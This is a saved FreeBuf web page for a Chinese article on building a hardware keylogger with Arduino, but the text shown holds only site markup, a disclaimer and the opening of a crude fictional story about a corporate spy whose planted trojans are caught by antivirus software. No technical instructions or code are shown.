<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  间谍游戏：用Arduino制作硬件键盘记录器 - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="免责声明：本文纯属虚构，本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!


‍‍‍‍星期天的早晨，在睡梦中意淫了一晚上杨尼美的刘尼玛被一阵突如其来的电话铃声所惊醒，不得不骂骂…" />
<meta name="keywords" content="arduino, 键盘记录器, 最全安全工具信息,安全工具下载地址,安全工具排行, 极客, 网络安全案例分享,网络安全知识大全,网络安全技术" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='一年一度的Pwn2Own 2015黑客大赛开始报名了' href='http://www.freebuf.com/news/59014.html' />
<link rel='next' title='Windows平台下高级Shellcode编程技术' href='http://www.freebuf.com/articles/system/58920.html' />
<link rel='canonical' href='http://www.freebuf.com/sectool/59045.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=59045' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    间谍游戏：用Arduino制作硬件键盘记录器                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/banish" title="由 banish 发布" rel="author">banish</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2015-02-15</span>
                                                                                                            <span class="look">共<strong>294756</strong>人围观
                                        ，发现 <strong>21</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./sectool">工具</a><a href="http://www.freebuf.com/./geek">极客</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p><span style="color: rgb(255, 0, 0);">免责声明：本文纯属虚构，本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!</span></p>
<p style="text-align: center;"><span style="color: rgb(0, 176, 80);"><strong><img data-original="http://image.3001.net/images/20150215/14239921847290.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="007.jpg"/></strong></span></p>
<noscript><img src="http://image.3001.net/images/20150215/14239921847290.jpg!small" title="007.jpg"/></strong></span></p></noscript>
<p><span style="line-height: 18px; background-color: white;"><span id="_baidu_bookmark_start_0" style="display: none; line-height: 0px;">‍</span></span><span id="_baidu_bookmark_start_2" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_4" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_6" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(0, 176, 80);"><strong>星期天的早晨，在睡梦中意淫了一晚上杨尼美的刘尼玛被一阵突如其来的电话铃声所惊醒，不得不骂骂咧咧的爬起来接电话，结果一看号码居然是主管打来的，刘尼玛的瞌睡顿时全醒了，主管在电话中把他劈头盖脸的一顿臭骂。</strong></span><span id="_baidu_bookmark_end_7" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_5" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_3" style="display: none; line-height: 0px;">‍</span><span style="line-height: 18px; background-color: white;"><span id="_baidu_bookmark_end_1" style="display: none; line-height: 0px;">‍</span></span><br/></p>
<pre class="prettyprint lang-html">起因是两天前主管安排刘尼玛去生意伙伴那里取一些资料，并向老总申请了公司的移动硬盘，结果老总今天使用硬盘的时候，杀毒软件报警，从里面查出来200多个木马，气急败坏的老总用谁也听不懂的家乡土话骂了主管的七舅老爷和八姨夫等等各种八竿子打不着的亲戚，憋了一肚子火憋得蛋疼的主管在挨完骂之后立马把电话打给了罪魁祸首刘尼玛，于是刘尼玛的各种八竿子打不着的亲戚外加十八代祖宗也被牵连了…</pre>
<p><span id="_baidu_bookmark_start_0" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_2" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_4" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_6" style="display: none; line-height: 0px;">‍</span>放下电话的刘尼玛冷汗直流，浑身哆嗦了好久，好不容易稍微平静之后，他手抖着点上了一支烟，却突然发觉内裤湿了，不知是刚才吓尿了还是昨晚梦见和杨尼美用各种姿势翻云覆雨的时候弄湿的。</p>
<p>他恐惧的原因不是因为工作中犯了错误被K了，而是这些木马病毒本身就是身为商业间谍的他故意种进去的，只是因为公司安装了强大的企业版杀毒软件，已经做过免杀的木马还是被查了出来。</p>
<p><span style="color: rgb(0, 0, 0);"><strong>“还好没有被发觉，他们都认为我是不小心中的毒”，刘尼玛擦了一把冷汗，一边自言自语一边用密码给总部发了一条信息.</strong></span><span id="_baidu_bookmark_end_7" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_5" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_3" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_1" style="display: none; line-height: 0px;">‍</span></p>
